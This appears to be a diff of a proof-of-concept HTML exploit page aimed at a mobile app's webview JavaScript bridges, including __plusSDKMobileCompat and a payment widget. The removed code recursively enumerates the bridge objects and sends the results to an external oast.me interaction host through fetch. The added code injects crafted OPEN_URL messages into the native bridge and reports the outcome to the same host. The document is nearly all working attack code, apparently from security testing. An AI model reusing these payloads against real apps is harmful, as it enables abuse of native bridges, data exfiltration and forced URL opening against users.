@@ -1,71 +1,24 @@
 <html><head><title>PoC</title></head>
 <body>
 <script>
-function enumerate(obj, path, depth, maxDepth) {
-  if (depth > maxDepth || !obj) return {};
-  var result = {};
-  var props = [];
-  try { props = props.concat(Object.getOwnPropertyNames(obj)); } catch(e){}
-  try { props = props.concat(Object.keys(obj)); } catch(e){}
-  try {
-    var proto = Object.getPrototypeOf(obj);
-    if (proto && proto !== Object.prototype) {
-      props = props.concat(Object.getOwnPropertyNames(proto));
-    }
-  } catch(e){}
-  // Dedupe
-  props = props.filter(function(v,i,a){ return a.indexOf(v) === i; });
+// Send OPEN_URL message to native via the bridge
+// From Android code: d4 class has @SerialName("OPEN_URL")
+// Let's try various payload formats
 
-  props.forEach(function(key) {
-    var fullPath = path + "." + key;
-    try {
-      var val = obj[key];
-      var type = typeof val;
-      if (type === 'function') {
-        result[fullPath] = {type:'function', str: val.toString().substring(0,300)};
-      } else if (type === 'object' && val !== null) {
-        result[fullPath] = {type:'object', keys: Object.keys(val)};
-        if (depth < maxDepth) {
-          var sub = enumerate(val, fullPath, depth+1, maxDepth);
-          for (var k in sub) result[k] = sub[k];
-        }
-      } else {
-        result[fullPath] = {type: type, value: String(val).substring(0,200)};
-      }
-    } catch(e) {
-      result[fullPath] = {type:'error', msg: e.message};
-    }
-  });
-  return result;
-}
+var attempts = [
+  '{"type":"OPEN_URL","trackId":"test1","payload":{"url":"https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/openurl-worked"}}',
+  '{"type":"OPEN_URL","trackId":"test2","url":"https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/openurl2-worked"}',
+  '{"type":"OPEN_URL","payload":{"url":"https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/openurl3-worked"}}',
+  '{"type":"OPEN_URL","url":"https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/openurl4-worked"}',
+];
 
-var data = {};
+attempts.forEach(function(msg, i) {
+  setTimeout(function(){
+    window.__plusSDKMobileCompat.onMessage(msg);
+  }, i * 500);
+});
 
-// Enumerate __plusSDKMobileCompat deeply
-data.plusSDK = enumerate(window.__plusSDKMobileCompat, "__plusSDKMobileCompat", 0, 4);
-
-// Enumerate __webviewPaymentWidget deeply
-data.payWidget = enumerate(window.__webviewPaymentWidget, "__webviewPaymentWidget", 0, 4);
-
-// Also enumerate webkit.messageHandlers
-try {
-  data.webkit = enumerate(window.webkit, "webkit", 0, 4);
-} catch(e) {
-  data.webkitErr = e.message;
-}
-
-// Send in chunks if too large
-var json = JSON.stringify(data);
-if (json.length > 4000) {
-  // Split
-  fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/enum1?" + encodeURIComponent(JSON.stringify(data.plusSDK)));
-  fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/enum2?" + encodeURIComponent(JSON.stringify(data.payWidget)));
-  fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/enum3?" + encodeURIComponent(JSON.stringify(data.webkit || {})));
-} else {
-  fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/enum-all?" + encodeURIComponent(json));
-}
-
-document.title = "Enumerated: " + Object.keys(data.plusSDK).length + " + " + Object.keys(data.payWidget).length + " props";
+fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/open-url-sent?count=" + attempts.length);
 </script>
 </body>
 </html>
